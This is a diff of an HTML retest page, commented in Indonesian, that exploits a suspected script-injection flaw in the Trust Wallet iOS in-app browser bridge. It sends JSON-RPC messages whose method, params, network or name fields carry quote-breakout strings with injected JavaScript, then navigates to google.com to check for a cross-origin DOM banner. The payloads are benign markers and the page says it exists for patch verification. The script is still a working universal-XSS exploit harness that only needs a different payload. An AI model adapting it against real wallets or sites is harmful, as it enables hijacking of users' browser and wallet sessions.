@@ -3,105 +3,139 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Trust Wallet bridge injection — retest (payload jinak)</title>
+  <title>Trust Wallet bridge retest v2 — control + lintas-origin (jinak)</title>
   <style>
-    body { font-family: -apple-system, system-ui, sans-serif; margin: 16px; line-height: 1.4; }
-    h1 { font-size: 18px; }
-    button { font-size: 16px; padding: 10px 16px; margin: 6px 0; }
+    body { font-family: -apple-system, system-ui, sans-serif; margin: 16px; line-height: 1.45; }
+    h1 { font-size: 18px; } h2 { font-size: 15px; margin-top: 22px; }
+    button { font-size: 16px; padding: 10px 16px; margin: 6px 6px 6px 0; }
+    select { font-size: 16px; padding: 8px; }
     #log { white-space: pre-wrap; background: #111; color: #0f0; padding: 12px;
            border-radius: 8px; font-family: ui-monospace, Menlo, monospace; font-size: 13px; }
     .note { color: #555; font-size: 13px; }
+    .box { border: 1px solid #ddd; border-radius: 8px; padding: 12px; margin: 10px 0; }
   </style>
 </head>
 <body>
-  <h1>Bridge injection retest — payload jinak</h1>
+  <h1>Bridge retest v2 — control + lintas-origin</h1>
   <p class="note">
-    Hanya untuk verifikasi patch di perangkat/akun Anda sendiri. Payload cuma
-    <code>alert(document.domain)</code>. Tidak ada connect wallet, tidak ada sign,
-    tidak ada transfer aset. Jika sebuah <code>alert</code> muncul, breakout untuk
-    varian itu MASIH ada.
+    Hanya untuk verifikasi patch di perangkat/akun Anda sendiri. Payload jinak:
+    <code>alert(document.domain)</code> (control) dan penyisipan penanda
+    <code>&lt;h1&gt;</code> ke DOM (lintas-origin). Tanpa connect wallet, tanpa sign,
+    tanpa transfer aset.
   </p>
 
-  <button id="run">Jalankan semua varian</button>
+  <!-- ================= BAGIAN A: CONTROL POSITIF ================= -->
+  <div class="box">
+    <h2>A. Control positif — buktikan bukti bisa muncul</h2>
+    <p class="note">Jalankan ini DULU. Kalau di sini pun tidak muncul, maka "tidak ada
+      alert" pada retest bukan bukti aman — melainkan dialog/DOM sedang dibungkam.</p>
+    <button id="ctlAlert">Tes alert()</button>
+    <button id="ctlDom">Tes penanda DOM</button>
+  </div>
+
+  <!-- ================= BAGIAN B: LINTAS-ORIGIN ================= -->
+  <div class="box">
+    <h2>B. Uji breakout lintas-origin (bukti marker DOM di google.com)</h2>
+    <p class="note">
+      Pilih penutup + field, tap Jalankan. Halaman akan spam RPC lalu navigasi ke
+      google.com. <b>Setelah sampai di google.com, cari banner hijau di paling atas
+      halaman</b>: "TW-UXSS-LAB: executed in …". Jika banner MUNCUL → breakout
+      lintas-origin MASIH ada (laporkan). Jika halaman google normal tanpa banner →
+      varian itu tertutup. Ulangi untuk tiap kombinasi.
+    </p>
+    Penutup:
+    <select id="closer">
+      <option value='");'>double-quote + )  [");]</option>
+      <option value="');">single-quote + )  [');]</option>
+      <option value="`);">backtick + )  [`);]</option>
+      <option value="\">trailing backslash  [\]</option>
+      <option value="");">unicode-escaped quote  ["]</option>
+    </select>
+    Field:
+    <select id="field">
+      <option value="method">method</option>
+      <option value="params">params</option>
+      <option value="network">network</option>
+      <option value="name">name</option>
+    </select>
+    <br>
+    <button id="runXo">Jalankan &amp; navigasi ke google.com</button>
+  </div>
+
   <pre id="log">Menunggu…</pre>
 
   <script>
     'use strict';
-
     const log = document.querySelector('#log');
-    const runBtn = document.querySelector('#run');
     const lines = [];
-    function put(s) { lines.push(s); log.textContent = lines.join('\n'); }
+    function put(s){ lines.push(s); log.textContent = lines.join('\n'); }
 
-    // Payload jinak: hanya buktikan konteks eksekusi. Tanpa provider/sign.
-    const PAYLOAD = "alert(document.domain)";
+    // ---------- Bagian A: control positif ----------
+    document.querySelector('#ctlAlert').addEventListener('click', () => {
+      alert(document.domain); // jalur sah — buktikan dialog bisa render di konteks ini
+      put('Control alert: dipanggil. Jika dialog muncul → alert AKTIF di konteks ini.');
+    });
+    document.querySelector('#ctlDom').addEventListener('click', () => {
+      document.body.insertAdjacentHTML('afterbegin',
+        '<h1 id="tw-ctl" style="background:#0f0;color:#000;margin:0">CONTROL: DOM marker OK — '
+        + document.domain + '</h1>');
+      put('Control DOM: penanda disisipkan. Jika banner hijau muncul → injeksi DOM AKTIF.');
+    });
 
-    // Beragam penutup string (breakout) untuk melawan escaping berbasis satu-quote.
-    // Masing-masing mencoba menutup string yang dibangun native lalu menyisipkan PAYLOAD
-    // lalu mengomentari sisa baris.
-    const breakouts = [
-      { closer: '");',  desc: 'double-quote + )'       , make: () => `zz_");${PAYLOAD}//` },
-      { closer: "');",  desc: 'single-quote + )'       , make: () => `zz_');${PAYLOAD}//` },
-      { closer: '`);',  desc: 'backtick + )'           , make: () => 'zz_`);' + PAYLOAD + '//' },
-      { closer: '\\',   desc: 'trailing backslash'     , make: () => `zz_\\";${PAYLOAD}//` },
-      { closer: '\\u',  desc: 'unicode-escaped quote'  , make: () => `zz_\\u0022);${PAYLOAD}//` }
-    ];
-
-    // Field yang mungkin ikut di-concat ke JS yang di-eval native.
-    function buildMessages(payloadStr, baseId) {
+    // ---------- Bagian B: lintas-origin ----------
+    // Payload jinak: HANYA sisip penanda DOM di origin google.com. Tanpa provider/sign.
+    function buildPayload() {
       return [
-        { where: 'method',  obj: { method: payloadStr,     params: [],            jsonrpc: '2.0' } },
-        { where: 'params',  obj: { method: 'eth_chainId',  params: [payloadStr],  jsonrpc: '2.0' } },
-        { where: 'network', obj: { method: 'eth_chainId',  params: [],            jsonrpc: '2.0' }, network: payloadStr },
-        { where: 'name',    obj: { method: 'eth_chainId',  params: [],            jsonrpc: '2.0' }, name: payloadStr }
-      ].map((m, k) => ({
-        id: baseId + k,
-        network: m.network ?? 'ethereum',
-        name: m.name ?? 'rpcCall',
-        object: m.obj,
-        where: m.where
-      }));
+        '(function(){',
+        "if(!/(^|\\.)google\\.com$/.test(location.hostname))return;",
+        'if(window.__twLab)return; window.__twLab=1;',
+        "document.body&&document.body.insertAdjacentHTML('afterbegin',",
+        "'<h1 id=tw-uxss-lab style=\"background:#0f0;color:#000;margin:0\">TW-UXSS-LAB: executed in '+document.domain+'</h1>');",
+        '})();'
+      ].join('');
     }
 
-    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+    function makeMarker(closer, payload) {
+      // Menutup string yang (mungkin) dibangun native, sisip payload, komentari sisa.
+      if (closer === '\\')       return 'zz_\\";' + payload + '//';
+      if (closer === '\u0022);' || closer === '\\u0022);')
+                                 return 'zz_\\u0022);' + payload + '//';
+      return 'zz_' + closer + payload + '//';
+    }
 
-    runBtn.addEventListener('click', async () => {
-      lines.length = 0;
+    function buildMessage(field, payloadStr, id) {
+      const base = { id, network: 'ethereum', name: 'rpcCall',
+                     object: { method: 'eth_chainId', params: [], jsonrpc: '2.0' } };
+      if (field === 'method')  base.object.method = payloadStr;
+      if (field === 'params')  base.object.params = [payloadStr];
+      if (field === 'network') base.network = payloadStr;
+      if (field === 'name')    base.name = payloadStr;
+      return base;
+    }
+
+    document.querySelector('#runXo').addEventListener('click', () => {
       const bridge = window.webkit?.messageHandlers?._tw_;
       if (!bridge || typeof bridge.postMessage !== 'function' ||
           !window.trustwallet?.ethereum) {
-        put('Buka halaman ini di DApp browser Trust Wallet iOS (build yang sudah dipatch).');
+        put('Buka di DApp browser Trust Wallet iOS (build yang sudah dipatch).');
         return;
       }
+      const closer = document.querySelector('#closer').value;
+      const field  = document.querySelector('#field').value;
+      const payloadStr = makeMarker(closer, buildPayload());
+      const baseId = Math.trunc(Date.now() % 9000000000000000);
 
-      put('Mulai retest. Amati apakah ada dialog alert yang muncul.');
-      put('Jika TIDAK ada alert sama sekali → patch menutup semua varian ini.\n');
-
-      let baseId = Math.trunc(Date.now() % 9000000000000000);
-
-      for (const b of breakouts) {
-        const payloadStr = b.make();
-        const msgs = buildMessages(payloadStr, baseId);
-        put(`— Breakout: ${b.desc}  [${b.closer}]`);
-        for (const msg of msgs) {
-          try {
-            bridge.postMessage(msg);
-            put(`    field=${msg.where}: terkirim (id ${msg.id})`);
-          } catch (e) {
-            put(`    field=${msg.where}: bridge menolak → ${String(e)}`);
-          }
-          await sleep(150); // beri jeda agar tiap eval terisolasi
-        }
-        baseId += 100;
-        put('');
+      lines.length = 0;
+      put(`Kombinasi: closer=[${closer}]  field=${field}`);
+      let sent = 0;
+      for (let i = 0; i < 8; i++) {
+        try { bridge.postMessage(buildMessage(field, payloadStr, baseId + i)); sent++; }
+        catch (e) { put(`Bridge menolak ke-${i+1}: ${String(e)}`); break; }
       }
-
-      put('Selesai. Ringkasan:');
-      put('  • Muncul alert pada suatu varian  → breakout MASIH ada di field/closer itu (laporkan).');
-      put('  • Tidak ada alert pada semua varian → kelas injeksi ini kemungkinan sudah tuntas.');
-      put('\nCatatan: fix yang benar = native berhenti membangun JS via string-concat');
-      put('(pakai JSON.stringify/parse atau evaluateJavaScript dengan nilai ter-serialize).');
-    }, { once: false });
+      put(`${sent} request terkirim. Navigasi ke google.com…`);
+      put('>>> Setelah sampai, cari banner hijau "TW-UXSS-LAB" di paling atas halaman.');
+      setTimeout(() => location.assign('https://google.com/'), 120);
+    });
   </script>
 </body>
 </html>
